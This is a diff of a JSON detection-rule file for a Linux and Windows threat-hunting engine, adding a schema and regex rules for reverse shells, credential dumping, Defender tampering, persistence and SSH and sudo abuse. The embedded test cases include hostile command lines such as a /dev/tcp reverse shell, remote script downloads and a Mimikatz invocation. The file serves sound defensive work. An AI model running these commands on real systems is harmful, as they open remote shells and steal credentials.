@@ -1,12 +1,158 @@
 {
+  "schema": {
+    "version": "1.0",
+    "description": "Canonical schema for Linux threat detection rules consumed by hunting.rule_engine.",
+    "fields": {
+      "rule_id": {
+        "type": "string",
+        "required": true,
+        "unique": true,
+        "description": "Stable unique identifier for the rule."
+      },
+      "name": {
+        "type": "string",
+        "required": true,
+        "description": "Short human-readable rule name."
+      },
+      "description": {
+        "type": "string",
+        "required": true,
+        "description": "What the rule detects."
+      },
+      "enabled": {
+        "type": "boolean",
+        "required": true,
+        "default": true,
+        "description": "Whether the rule should be evaluated."
+      },
+      "log_source": {
+        "type": "string",
+        "required": true,
+        "allowed": [
+          "processes",
+          "services",
+          "scheduled_tasks",
+          "startup_commands",
+          "users",
+          "listening_ports",
+          "secure_log"
+        ],
+        "description": "Collected data section to evaluate; secure_log maps to CentOS /var/log/secure and needs collector support."
+      },
+      "regex_pattern": {
+        "type": "string",
+        "required": true,
+        "format": "Python re",
+        "description": "Regular expression applied to each line of the selected log source."
+      },
+      "severity": {
+        "type": "string",
+        "required": true,
+        "allowed": ["critical", "high", "medium", "low", "info"],
+        "description": "Finding severity; must exist in hunting.engine.SEVERITY_RANK."
+      },
+      "severity_map": {
+        "type": "object",
+        "required": false,
+        "description": "Optional severity overrides keyed by source, action, authorization state or privilege context."
+      },
+      "baseline_keys": {
+        "type": "array",
+        "required": false,
+        "items": "string",
+        "description": "Baseline sections used when requires_baseline is true; dot paths are supported."
+      },
+      "threshold": {
+        "type": "integer",
+        "required": true,
+        "minimum": 1,
+        "default": 1,
+        "description": "Number of matching events required before a finding is emitted."
+      },
+      "time_window_minutes": {
+        "type": "integer",
+        "required": true,
+        "minimum": 0,
+        "default": 0,
+        "description": "Correlation window for threshold-based detections; 0 disables aggregation."
+      },
+      "group_by": {
+        "type": "array",
+        "required": false,
+        "items": "string",
+        "description": "Named regex groups used to correlate events for threshold and time-window rules."
+      },
+      "privileged_groups": {
+        "type": "array",
+        "required": false,
+        "items": "string",
+        "description": "Group names considered privileged for membership-change rules."
+      },
+      "mitre_techniques": {
+        "type": "array",
+        "required": true,
+        "items": "string",
+        "description": "ATT&CK technique IDs; all IDs are reported and legacy technique mirrors the first canonical ID."
+      },
+      "detection_type": {
+        "type": "string",
+        "required": true,
+        "allowed": ["regex", "threshold", "time_window", "sequence_correlation", "baseline_comparison"],
+        "description": "How the Rule Engine should evaluate the rule."
+      },
+      "named_groups": {
+        "type": "object",
+        "required": false,
+        "description": "Mapping of regex named-group names to their meaning for finding enrichment."
+      },
+      "requires_baseline": {
+        "type": "boolean",
+        "required": false,
+        "default": false,
+        "description": "True when hunting.checks.baseline_checks must supply the finding."
+      },
+      "correlation": {
+        "type": "object",
+        "required": false,
+        "description": "Chronological correlation config: preceding_pattern, preceding_threshold, time_window_minutes, group_by, time_field and order."
+      },
+      "tests": {
+        "type": "array",
+        "required": true,
+        "description": "Embedded positive/negative cases executed by run_rule_tests()."
+      }
+    },
+    "legacy_aliases": {
+      "id": "rule_id",
+      "target": "log_source",
+      "pattern": "regex_pattern",
+      "technique": "mitre_techniques[0]"
+    },
+    "notes": [
+      "Canonical fields are authoritative; legacy aliases are retained for compatibility.",
+      "All canonical ATT&CK IDs are evaluated; hunting/attack.json is a fallback catalog and the live CTI dataset is authoritative.",
+      "secure_log is collected by hunting.checks from CentOS /var/log/secure or Debian /var/log/auth.log."
+    ]
+  },
   "rules": [
     {
+      "rule_id": "PS_ENCODED_COMMAND",
       "id": "PS_ENCODED_COMMAND",
+      "name": "Encoded PowerShell command",
       "description": "PowerShell launched with an encoded command",
+      "enabled": true,
+      "log_source": "processes",
       "target": "processes",
+      "regex_pattern": "(?i)powershell.{0,100}(-enc|-encodedcommand)",
       "pattern": "(?i)powershell.{0,100}(-enc|-encodedcommand)",
-      "technique": "T1059.001",
       "severity": "high",
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1059.001"],
+      "technique": "T1059.001",
+      "detection_type": "regex",
+      "named_groups": {},
+      "requires_baseline": false,
       "tests": [
         {
           "text": "powershell.exe -NoProfile -enc ZQBjAGgAbw==",
@@ -19,12 +165,23 @@
       ]
     },
     {
+      "rule_id": "MIMIKATZ_LSASS",
       "id": "MIMIKATZ_LSASS",
+      "name": "Credential dumping tool",
       "description": "Credential dumping tool or LSASS access",
+      "enabled": true,
+      "log_source": "processes",
       "target": "processes",
+      "regex_pattern": "(?i)(mimikatz|sekurlsa|procdump.*lsass)",
       "pattern": "(?i)(mimikatz|sekurlsa|procdump.*lsass)",
-      "technique": "T1003.001",
       "severity": "critical",
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1003.001"],
+      "technique": "T1003.001",
+      "detection_type": "regex",
+      "named_groups": {},
+      "requires_baseline": false,
       "tests": [
         {
           "text": "C:\\Temp\\mimikatz.exe privilege::debug",
@@ -37,12 +194,23 @@
       ]
     },
     {
+      "rule_id": "DEFENDER_DISABLED",
       "id": "DEFENDER_DISABLED",
+      "name": "Defender monitoring disabled",
       "description": "Defender real-time monitoring disabled",
+      "enabled": true,
+      "log_source": "processes",
       "target": "processes",
+      "regex_pattern": "(?i)(Disable-RealtimeMonitoring|Set-MpPreference.*-Disable)",
       "pattern": "(?i)(Disable-RealtimeMonitoring|Set-MpPreference.*-Disable)",
-      "technique": "T1562.001",
       "severity": "high",
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1685"],
+      "technique": "T1685",
+      "detection_type": "regex",
+      "named_groups": {},
+      "requires_baseline": false,
       "tests": [
         {
           "text": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
@@ -55,12 +223,23 @@
       ]
     },
     {
+      "rule_id": "RUN_KEY_PERSISTENCE",
       "id": "RUN_KEY_PERSISTENCE",
+      "name": "Registry Run key persistence",
       "description": "Autorun registry key modified",
+      "enabled": true,
+      "log_source": "startup_commands",
       "target": "startup_commands",
+      "regex_pattern": "(?i)(CurrentVersion.*Run|RunOnce)",
       "pattern": "(?i)(CurrentVersion.*Run|RunOnce)",
-      "technique": "T1547.001",
       "severity": "medium",
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1547.001"],
+      "technique": "T1547.001",
+      "detection_type": "regex",
+      "named_groups": {},
+      "requires_baseline": false,
       "tests": [
         {
           "text": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run = updater.exe",
@@ -73,12 +252,23 @@
       ]
     },
     {
+      "rule_id": "SUSPICIOUS_SCHTASK",
       "id": "SUSPICIOUS_SCHTASK",
+      "name": "Scheduled task runs interpreter",
       "description": "Scheduled task runs a script interpreter",
+      "enabled": true,
+      "log_source": "scheduled_tasks",
       "target": "scheduled_tasks",
+      "regex_pattern": "(?i)(powershell|cmd\\.exe|wscript|mshta)",
       "pattern": "(?i)(powershell|cmd\\.exe|wscript|mshta)",
-      "technique": "T1053.005",
       "severity": "medium",
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1053.005"],
+      "technique": "T1053.005",
+      "detection_type": "regex",
+      "named_groups": {},
+      "requires_baseline": false,
       "tests": [
         {
           "text": "TaskName: Update | powershell.exe -File C:\\Temp\\u.ps1",
@@ -91,12 +281,23 @@
       ]
     },
     {
+      "rule_id": "SUSPICIOUS_SERVICE",
       "id": "SUSPICIOUS_SERVICE",
+      "name": "Suspicious system service",
       "description": "New service with a suspicious name",
+      "enabled": true,
+      "log_source": "services",
       "target": "services",
+      "regex_pattern": "(?i)(backdoor|malware|evil|psexesvc)",
       "pattern": "(?i)(backdoor|malware|evil|psexesvc)",
-      "technique": "T1543.003",
       "severity": "high",
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1543.003"],
+      "technique": "T1543.003",
+      "detection_type": "regex",
+      "named_groups": {},
+      "requires_baseline": false,
       "tests": [
         {
           "text": "evil-service | Running",
@@ -109,12 +310,23 @@
       ]
     },
     {
+      "rule_id": "NEW_LOCAL_ACCOUNT",
       "id": "NEW_LOCAL_ACCOUNT",
+      "name": "Suspicious local account",
       "description": "Local account with a suspicious name",
+      "enabled": true,
+      "log_source": "users",
       "target": "users",
+      "regex_pattern": "(?i)(backdoor|hacker|tempuser|svc_evil)",
       "pattern": "(?i)(backdoor|hacker|tempuser|svc_evil)",
-      "technique": "T1136.001",
       "severity": "medium",
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1136.001"],
+      "technique": "T1136.001",
+      "detection_type": "regex",
+      "named_groups": {},
+      "requires_baseline": false,
       "tests": [
         {
           "text": "backdoor_admin",
@@ -127,12 +339,23 @@
       ]
     },
     {
+      "rule_id": "REMOTE_SCRIPT_DOWNLOAD",
       "id": "REMOTE_SCRIPT_DOWNLOAD",
+      "name": "Remote script download",
       "description": "Download and execute a remote script",
+      "enabled": true,
+      "log_source": "processes",
       "target": "processes",
+      "regex_pattern": "(?i)(curl|wget|iwr|Invoke-WebRequest).{0,100}(https?://).{0,100}(\\.ps1|\\.sh|\\.exe)",
       "pattern": "(?i)(curl|wget|iwr|Invoke-WebRequest).{0,100}(https?://).{0,100}(\\.ps1|\\.sh|\\.exe)",
-      "technique": "T1071.001",
       "severity": "high",
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1071.001"],
+      "technique": "T1071.001",
+      "detection_type": "regex",
+      "named_groups": {},
+      "requires_baseline": false,
       "tests": [
         {
           "text": "powershell.exe iwr http://10.0.0.9/stage.ps1 -OutFile stage.ps1",
@@ -140,6 +363,384 @@
         },
         {
           "text": "powershell.exe Get-ChildItem C:\\Temp",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "rule_id": "LINUX_INTERACTIVE_SHELL",
+      "id": "LINUX_INTERACTIVE_SHELL",
+      "name": "Reverse shell via /dev/tcp",
+      "description": "Interactive shell redirected to a remote TCP endpoint",
+      "enabled": true,
+      "log_source": "processes",
+      "target": "processes",
+      "regex_pattern": "(?i)(?:bash|sh)\\s+-i\\s+.*?/?dev/tcp/(?P<host>[0-9.]+)/(?P<port>\\d{2,5})",
+      "pattern": "(?i)(?:bash|sh)\\s+-i\\s+.*?/?dev/tcp/(?P<host>[0-9.]+)/(?P<port>\\d{2,5})",
+      "severity": "high",
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1059.004"],
+      "technique": "T1059.004",
+      "detection_type": "regex",
+      "named_groups": {
+        "host": "Remote endpoint extracted from the /dev/tcp redirection.",
+        "port": "Remote port extracted from the /dev/tcp redirection."
+      },
+      "requires_baseline": false,
+      "tests": [
+        {
+          "text": "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1",
+          "expect": true
+        },
+        {
+          "text": "bash -c 'echo hello'",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "rule_id": "LINUX_CRONTAB_PERSISTENCE",
+      "id": "LINUX_CRONTAB_PERSISTENCE",
+      "name": "Cron job invokes interpreter or downloader",
+      "description": "Cron entry launches a shell, Python, curl or wget",
+      "enabled": true,
+      "log_source": "scheduled_tasks",
+      "target": "scheduled_tasks",
+      "regex_pattern": "(?i)(?P<interpreter>bash|sh|python3?|curl|wget).*?(?:/tmp/|https?://)",
+      "pattern": "(?i)(?P<interpreter>bash|sh|python3?|curl|wget).*?(?:/tmp/|https?://)",
+      "severity": "medium",
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1053.003"],
+      "technique": "T1053.003",
+      "detection_type": "regex",
+      "named_groups": {
+        "interpreter": "Interpreter or downloader invoked by the cron job."
+      },
+      "requires_baseline": false,
+      "tests": [
+        {
+          "text": "* * * * * /bin/bash /tmp/update.sh",
+          "expect": true
+        },
+        {
+          "text": "0 2 * * * /usr/sbin/logrotate /etc/logrotate.conf",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "rule_id": "LINUX_SYSTEMD_SUSPICIOUS_UNIT",
+      "id": "LINUX_SYSTEMD_SUSPICIOUS_UNIT",
+      "name": "Suspicious systemd unit name",
+      "description": "Running systemd unit has a suspicious name",
+      "enabled": true,
+      "log_source": "services",
+      "target": "services",
+      "regex_pattern": "(?i)(?P<suspicious_name>backdoor|malware|evil|psexesvc)",
+      "pattern": "(?i)(?P<suspicious_name>backdoor|malware|evil|psexesvc)",
+      "severity": "high",
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1543.002"],
+      "technique": "T1543.002",
+      "detection_type": "regex",
+      "named_groups": {
+        "suspicious_name": "Suspicious keyword found in the unit name."
+      },
+      "requires_baseline": false,
+      "tests": [
+        {
+          "text": "evil.service | loaded active running",
+          "expect": true
+        },
+        {
+          "text": "sshd.service | loaded active running",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "rule_id": "LINUX_REPEATED_SUSPICIOUS_COMMAND",
+      "id": "LINUX_REPEATED_SUSPICIOUS_COMMAND",
+      "name": "Repeated downloader invocation",
+      "description": "Multiple curl or wget downloads within a short window",
+      "enabled": true,
+      "log_source": "processes",
+      "target": "processes",
+      "regex_pattern": "(?i)(?:curl|wget).*?(?P<url>https?://\\S+)",
+      "pattern": "(?i)(?:curl|wget).*?(?P<url>https?://\\S+)",
+      "severity": "medium",
+      "threshold": 3,
+      "time_window_minutes": 5,
+      "mitre_techniques": ["T1071.001"],
+      "technique": "T1071.001",
+      "detection_type": "time_window",
+      "named_groups": {
+        "url": "Remote URL requested by the downloader."
+      },
+      "requires_baseline": false,
+      "tests": [
+        {
+          "text": "curl http://192.0.2.10/stage.sh",
+          "expect": true
+        },
+        {
+          "text": "ls -la /tmp",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "rule_id": "LINUX_UNEXPECTED_ACCOUNT_BASELINE",
+      "id": "LINUX_UNEXPECTED_ACCOUNT_BASELINE",
+      "name": "Unexpected local account",
+      "description": "Account not present in the known account baseline",
+      "enabled": true,
+      "log_source": "users",
+      "target": "users",
+      "regex_pattern": "(?!)",
+      "pattern": "(?!)",
+      "severity": "medium",
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1136.001"],
+      "technique": "T1136.001",
+      "detection_type": "baseline_comparison",
+      "named_groups": {},
+      "requires_baseline": true,
+      "tests": [
+        {
+          "text": "any",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "rule_id": "LNX-AUTH-001",
+      "id": "LNX-AUTH-001",
+      "name": "SSH Brute Force",
+      "description": "More than 5 failed SSH password attempts from one source IP within 60 minutes",
+      "enabled": true,
+      "log_source": "secure_log",
+      "target": "secure_log",
+      "regex_pattern": "(?i)(?P<timestamp>[A-Z][a-z]{2}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}).*?Failed password for (?:invalid user )?(?P<username>\\S+) from (?P<source_ip>(?:\\d{1,3}\\.){3}\\d{1,3}) port \\d+ ssh2",
+      "pattern": "(?i)(?P<timestamp>[A-Z][a-z]{2}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}).*?Failed password for (?:invalid user )?(?P<username>\\S+) from (?P<source_ip>(?:\\d{1,3}\\.){3}\\d{1,3}) port \\d+ ssh2",
+      "severity": "high",
+      "severity_map": {
+        "external": "high",
+        "internal": "medium",
+        "internal_cidrs": "baseline.allowed_internal_ip_ranges"
+      },
+      "threshold": 6,
+      "time_window_minutes": 60,
+      "group_by": ["source_ip"],
+      "mitre_techniques": ["T1110"],
+      "technique": "T1110",
+      "detection_type": "time_window",
+      "named_groups": {
+        "timestamp": "CentOS secure log timestamp used for window evaluation.",
+        "username": "Account named in the failed password attempt.",
+        "source_ip": "Remote IPv4 address that generated the failures."
+      },
+      "requires_baseline": false,
+      "tests": [
+        {
+          "text": "Nov 25 10:12:34 centos7 sshd[1234]: Failed password for invalid user root from 192.0.2.10 port 43210 ssh2",
+          "expect": true
+        },
+        {
+          "text": "Nov 25 10:12:35 centos7 sshd[1234]: Failed password for alice from 198.51.100.23 port 43211 ssh2",
+          "expect": true
+        },
+        {
+          "text": "Nov 25 10:12:36 centos7 sshd[1234]: Accepted password for alice from 192.0.2.10 port 43212 ssh2",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "rule_id": "LNX-AUTH-002",
+      "id": "LNX-AUTH-002",
+      "name": "Successful Login After Failures",
+      "description": "Accepted SSH login from a source IP with at least 3 earlier failed password attempts",
+      "enabled": true,
+      "log_source": "secure_log",
+      "target": "secure_log",
+      "regex_pattern": "(?i)(?P<timestamp>[A-Z][a-z]{2}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}).*?Accepted (?:password|publickey) for (?P<username>\\S+) from (?P<source_ip>(?:\\d{1,3}\\.){3}\\d{1,3}) port \\d+ ssh2",
+      "pattern": "(?i)(?P<timestamp>[A-Z][a-z]{2}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}).*?Accepted (?:password|publickey) for (?P<username>\\S+) from (?P<source_ip>(?:\\d{1,3}\\.){3}\\d{1,3}) port \\d+ ssh2",
+      "severity": "high",
+      "threshold": 1,
+      "time_window_minutes": 60,
+      "group_by": ["source_ip"],
+      "mitre_techniques": ["T1110"],
+      "technique": "T1110",
+      "detection_type": "sequence_correlation",
+      "named_groups": {
+        "timestamp": "CentOS secure log timestamp used to order events.",
+        "username": "Account named in the accepted login.",
+        "source_ip": "Remote IPv4 address of the accepted login."
+      },
+      "requires_baseline": false,
+      "correlation": {
+        "preceding_pattern": "(?i)(?P<timestamp>[A-Z][a-z]{2}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}).*?Failed password for (?:invalid user )?(?P<username>\\S+) from (?P<source_ip>(?:\\d{1,3}\\.){3}\\d{1,3}) port \\d+ ssh2",
+        "preceding_threshold": 3,
+        "time_window_minutes": 60,
+        "group_by": ["source_ip"],
+        "time_field": "timestamp",
+        "order": "chronological"
+      },
+      "tests": [
+        {
+          "text": "Nov 25 10:20:01 centos7 sshd[1234]: Accepted password for alice from 192.0.2.10 port 43212 ssh2",
+          "expect": true
+        },
+        {
+          "text": "Nov 25 10:20:02 centos7 sshd[1234]: Accepted publickey for bob from 198.51.100.23 port 43213 ssh2",
+          "expect": true
+        },
+        {
+          "text": "Nov 25 10:20:03 centos7 sshd[1234]: Failed password for alice from 192.0.2.10 port 43214 ssh2",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "rule_id": "LNX-SUDO-001",
+      "id": "LNX-SUDO-001",
+      "name": "Unauthorized sudo activity",
+      "description": "Sudo command execution or authentication failures from users not in the trusted sudoers baseline",
+      "enabled": true,
+      "log_source": "secure_log",
+      "target": "secure_log",
+      "regex_pattern": "(?i)(?P<timestamp>[A-Z][a-z]{2}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}).*?sudo(?:\\[\\d+\\])?:\\s*(?:pam_unix\\(sudo:auth\\):\\s*authentication failure;.*?(?<!\\S)user=\\s*(?P<auth_user>\\S+)|(?P<command_user>[^:\\s]+)\\s*:\\s*TTY=.*?USER=(?P<target_user>\\S+)\\s*;\\s*COMMAND=)",
+      "pattern": "(?i)(?P<timestamp>[A-Z][a-z]{2}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}).*?sudo(?:\\[\\d+\\])?:\\s*(?:pam_unix\\(sudo:auth\\):\\s*authentication failure;.*?(?<!\\S)user=\\s*(?P<auth_user>\\S+)|(?P<command_user>[^:\\s]+)\\s*:\\s*TTY=.*?USER=(?P<target_user>\\S+)\\s*;\\s*COMMAND=)",
+      "severity": "high",
+      "severity_map": {
+        "unauthorized": "high",
+        "repeated_auth_failure": "medium"
+      },
+      "baseline_keys": [
+        "trusted_administrators",
+        "trusted_service_accounts",
+        "known_system_accounts"
+      ],
+      "threshold": 3,
+      "time_window_minutes": 10,
+      "group_by": ["auth_user", "command_user"],
+      "mitre_techniques": ["T1548.003", "T1110"],
+      "technique": "T1548.003",
+      "detection_type": "time_window",
+      "named_groups": {
+        "timestamp": "CentOS secure log timestamp used for window evaluation.",
+        "auth_user": "User named in a sudo authentication failure.",
+        "command_user": "User that executed a sudo command.",
+        "target_user": "Account targeted by the sudo command."
+      },
+      "requires_baseline": true,
+      "tests": [
+        {
+          "text": "Nov 25 10:30:03 centos7 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=0 euid=0 tty=pts/0 ruser= rhost=  user=alice",
+          "expect": true
+        },
+        {
+          "text": "Nov 25 10:30:01 centos7 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash",
+          "expect": true
+        },
+        {
+          "text": "Nov 25 10:30:04 centos7 sshd[1234]: Accepted password for alice from 192.0.2.10 port 43212 ssh2",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "rule_id": "LNX-USER-001",
+      "id": "LNX-USER-001",
+      "name": "New user or group creation",
+      "description": "useradd and groupadd events on CentOS secure logs",
+      "enabled": true,
+      "log_source": "secure_log",
+      "target": "secure_log",
+      "regex_pattern": "(?i)(?P<timestamp>[A-Z][a-z]{2}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}).*?(?P<action>useradd|groupadd)(?:\\[\\d+\\])?:\\s*(?:new user: name=(?P<username>[^,\\s]+)|new group: name=(?P<groupname>[^,\\s]+))",
+      "pattern": "(?i)(?P<timestamp>[A-Z][a-z]{2}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}).*?(?P<action>useradd|groupadd)(?:\\[\\d+\\])?:\\s*(?:new user: name=(?P<username>[^,\\s]+)|new group: name=(?P<groupname>[^,\\s]+))",
+      "severity": "medium",
+      "severity_map": {
+        "useradd": "medium",
+        "groupadd": "low"
+      },
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1136.001"],
+      "technique": "T1136.001",
+      "detection_type": "regex",
+      "named_groups": {
+        "timestamp": "CentOS secure log timestamp of the creation event.",
+        "action": "Either useradd or groupadd.",
+        "username": "Name of the newly created user.",
+        "groupname": "Name of the newly created group."
+      },
+      "requires_baseline": false,
+      "tests": [
+        {
+          "text": "Nov 25 10:31:01 centos7 useradd[1234]: new user: name=svc_backup, UID=1001, GID=1001, home=/home/svc_backup, shell=/bin/bash",
+          "expect": true
+        },
+        {
+          "text": "Nov 25 10:31:02 centos7 groupadd[1235]: new group: name=devops, GID=1002",
+          "expect": true
+        },
+        {
+          "text": "Nov 25 10:31:03 centos7 sshd[1234]: Accepted password for alice from 192.0.2.10 port 43212 ssh2",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "rule_id": "LNX-USER-002",
+      "id": "LNX-USER-002",
+      "name": "Privileged group membership change",
+      "description": "Addition of users to privileged groups such as wheel, compared against the trusted account baseline",
+      "enabled": true,
+      "log_source": "secure_log",
+      "target": "secure_log",
+      "regex_pattern": "(?i)(?P<timestamp>[A-Z][a-z]{2}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}).*?(?:usermod|gpasswd)(?:\\[\\d+\\])?:\\s*(?:add '(?P<username>[^']+)' to group '(?P<groupname>[^']+)'|user (?P<gpasswd_user>\\S+) added to group (?P<gpasswd_group>\\S+))",
+      "pattern": "(?i)(?P<timestamp>[A-Z][a-z]{2}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}).*?(?:usermod|gpasswd)(?:\\[\\d+\\])?:\\s*(?:add '(?P<username>[^']+)' to group '(?P<groupname>[^']+)'|user (?P<gpasswd_user>\\S+) added to group (?P<gpasswd_group>\\S+))",
+      "severity": "high",
+      "severity_map": {
+        "privileged": "high",
+        "non_privileged": "medium"
+      },
+      "baseline_keys": [
+        "trusted_administrators",
+        "trusted_service_accounts",
+        "known_system_accounts"
+      ],
+      "privileged_groups": ["wheel", "sudo", "root", "adm"],
+      "threshold": 1,
+      "time_window_minutes": 0,
+      "mitre_techniques": ["T1098.007", "T1098", "T1136.001"],
+      "technique": "T1098.007",
+      "detection_type": "baseline_comparison",
+      "named_groups": {
+        "timestamp": "CentOS secure log timestamp of the membership change.",
+        "username": "User added by usermod.",
+        "groupname": "Group named by usermod.",
+        "gpasswd_user": "User added by gpasswd.",
+        "gpasswd_group": "Group named by gpasswd."
+      },
+      "requires_baseline": true,
+      "tests": [
+        {
+          "text": "Nov 25 10:32:01 centos7 usermod[1239]: add 'alice' to group 'wheel'",
+          "expect": true
+        },
+        {
+          "text": "Nov 25 10:32:02 centos7 gpasswd[1240]: user bob added to group wheel",
+          "expect": true
+        },
+        {
+          "text": "Nov 25 10:32:03 centos7 sshd[1241]: Accepted password for alice from 192.0.2.10 port 43212 ssh2",
           "expect": false
         }
       ]
